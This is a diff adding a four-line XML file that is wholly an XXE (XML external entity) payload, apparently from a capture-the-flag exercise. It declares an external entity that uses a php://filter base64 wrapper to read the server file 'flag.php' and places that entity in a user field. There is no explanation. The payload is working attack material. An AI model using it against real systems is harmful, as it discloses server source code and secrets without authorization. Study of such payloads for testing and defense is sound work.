@@ -1,0 +1,4 @@
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]><root>
+	<user>&xxe;</user>
+	<year>xd</year>
+</root>
